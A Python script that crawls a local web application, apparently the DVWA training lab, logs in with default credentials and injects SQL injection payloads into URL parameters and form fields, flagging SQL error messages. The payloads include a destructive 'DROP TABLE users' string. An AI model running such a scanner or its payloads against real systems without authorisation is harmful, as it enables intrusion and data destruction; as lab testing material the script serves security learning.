

import os
import time
import json
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse


os.environ["NO_PROXY"] = "127.0.0.1,localhost"


def make_soup(html):
    try:
        return BeautifulSoup(html, "lxml")
    except Exception:
        return BeautifulSoup(html, "html.parser")


def normalize(base_url, link):
    return urljoin(base_url, link)


def extract_links(html, page_url):
    soup = make_soup(html)
    return [normalize(page_url, a["href"]) for a in soup.find_all("a", href=True)]


def extract_forms(html, page_url):
    soup = make_soup(html)
    forms = []
    for f in soup.find_all("form"):
        action = normalize(page_url, f.get("action") or page_url)
        method = (f.get("method") or "GET").upper()
        inputs = [{"name": inp.get("name"), "type": (inp.get("type") or inp.name).lower()}
                  for inp in f.find_all(["input", "textarea", "select"])]
        forms.append({"page": page_url, "action": action, "method": method, "inputs": inputs})
    return forms



def get_session():
    s = requests.Session()
    s.headers.update({"User-Agent": "SQLi-Tester"})
    return s


def find_sql_errors(html):

    error_signatures = [
        "SQL syntax", "Warning: mysql_", "Unclosed quotation mark",
        "quoted string not properly terminated", "PDOException"
    ]
    for sig in error_signatures:
        if sig.lower() in html.lower():
            return True, sig


    if "First name" in html and "Surname" in html:
        return True, "Possible UNION-based injection (user data shown)"

    return False, None



class Crawler:
    def __init__(self, base_url, session, max_pages=20, delay=0.2):
        self.base_url = base_url.rstrip("/")
        self.max_pages = max_pages
        self.delay = delay
        self.session = session
        self.visited = set()
        self.pages = {}
        self.forms = []

    def crawl(self):
        to_visit = [self.base_url]
        while to_visit and len(self.visited) < self.max_pages:
            url = to_visit.pop(0)
            if url in self.visited:
                continue
            try:
                print(f"[*] Crawling: {url}")  # debug
                response = self.session.get(url, timeout=5)
                html = response.text
                links = extract_links(html, url)
                forms = extract_forms(html, url)

                self.visited.add(url)
                self.pages[url] = {"links": links, "forms": forms}
                self.forms.extend(forms)

                for link in links:
                    if link.startswith(self.base_url) and link not in self.visited:
                        to_visit.append(link)
                time.sleep(self.delay)
            except Exception as e:
                print("Error visiting:", url, "->", e)
        return {"pages": self.pages, "forms": self.forms}



class SQLiTester:
    def __init__(self, session=None, timeout=5, delay=0.1):
        self.session = session or get_session()
        self.timeout = timeout
        self.delay = delay
        self.findings = []
        self.payloads = ["' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users; --"]

    def test_url_params(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return

        base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))

        for param in params:
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param] = payload
                test_query = urlencode(test_params, doseq=True)
                test_url = base_url + "?" + test_query

                print(f"[*] Testing URL param: {test_url}")  # debug

                try:
                    resp = self.session.get(test_url, timeout=self.timeout)
                    vuln, pattern = find_sql_errors(resp.text)
                    if vuln:
                        print(f"[!] Possible SQLi in {test_url} param={param} payload={payload}")
                        self.findings.append({
                            "type": "url_param",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "error": pattern
                        })
                except Exception as e:
                    print("Error testing param:", e)
                time.sleep(self.delay)

    def test_forms(self, forms_by_url):
        for form in forms_by_url:
            action = form["action"]
            method = form["method"]
            inputs = form["inputs"]


            data = {inp["name"]: "test" for inp in inputs if inp["name"]}

            for inp in inputs:
                if not inp["name"]:
                    continue
                for payload in self.payloads:
                    test_data = data.copy()
                    test_data[inp["name"]] = payload

                    print(f"[*] Submitting form {action} with {test_data}")  # debug

                    try:
                        if method == "POST":
                            resp = self.session.post(action, data=test_data, timeout=self.timeout)
                        else:
                            resp = self.session.get(action, params=test_data, timeout=self.timeout)

                        vuln, pattern = find_sql_errors(resp.text)
                        if vuln:
                            print(f"[!] Possible SQLi in form {action} field={inp['name']} payload={payload}")
                            self.findings.append({
                                "type": "form",
                                "action": action,
                                "field": inp["name"],
                                "payload": payload,
                                "error": pattern
                            })
                    except Exception as e:
                        print("Error submitting form:", e)
                    time.sleep(self.delay)

    def run(self, pages, forms):
        for url in pages:
            self.test_url_params(url)
        self.test_forms(forms)
        return self.findings



target = "http://localhost/setup.php"

session = requests.Session()
login_url = target + "/login.php"
login_data = {"username": "admin", "password": "password", "Login": "Login"}
response = session.post(login_url, data=login_data)

if "Login failed" in response.text:
    print("Login failed! Check credentials.")
else:
    print("Login successful!")

    crawler = Crawler(target, session, max_pages=20, delay=0.1)
    result = crawler.crawl()

    tester = SQLiTester(session)
    findings = tester.run(result["pages"], result["forms"])

    print("\nFindings")
    for f in findings:
        print(f)

    with open("dvwa_sqli_output.json", "w") as f:
        json.dump(findings, f, indent=4)
    print("\nResults saved in dvwa_sqli_output.json")






